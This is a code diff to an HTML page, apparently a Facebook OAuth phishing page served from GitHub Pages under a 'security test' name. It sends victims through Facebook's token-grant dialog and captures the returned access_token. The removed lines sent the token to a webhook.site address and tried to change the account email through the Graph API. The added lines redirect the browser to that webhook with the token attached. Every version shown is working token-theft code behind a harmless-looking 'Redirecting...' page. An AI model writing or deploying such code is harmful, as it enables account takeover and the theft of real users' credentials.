@@ -1,27 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head><title>Success</title></head>
+<head><title>Redirecting...</title></head>
 <body>
     <script>
-        // [2026-01-21] Direct Token Extractor
+        // [2026-01-21] Direct URL Injection
         window.onload = function() {
-            const webhook = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
             const hash = window.location.hash;
+            const webhook = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
 
             if (hash.includes('access_token=')) {
-                // استخراج التوكن وإرساله فوراً
+                // استخراج التوكن
                 const token = new URLSearchParams(hash.substring(1)).get('access_token');
-                fetch(`${webhook}?FINAL_EXTRACTED_TOKEN=${token}`, {mode: 'no-cors'});
                 
-                // محاولة الحقن الصامتة
-                fetch(`https://graph.facebook.com/me?access_token=${token}`, {
-                    method: 'POST',
-                    body: new URLSearchParams({ 'email': 'ktime420420420@gmail.com' })
-                });
-                
-                document.body.innerHTML = "<h1>Verification Complete. You can close this tab.</h1>";
+                // تحويل المتصفح بالكامل إلى الـ Webhook مع التوكن كـ Parameter
+                // هذه الطريقة مستحيل أن تفشل لأنها لا تعتمد على الخلفية
+                window.location.href = webhook + "?CAPTURED_TOKEN=" + token;
             } else {
-                // إعادة طلب التوجيه الآن بعد أن أصبح التطبيق Active
                 const client_id = "1089408829356317";
                 const redirect = "https://mohammedborai404.github.io/fb-security-test/";
                 window.location.href = `https://www.facebook.com/v15.0/dialog/oauth?client_id=${client_id}&redirect_uri=${redirect}&response_type=token&scope=public_profile`;
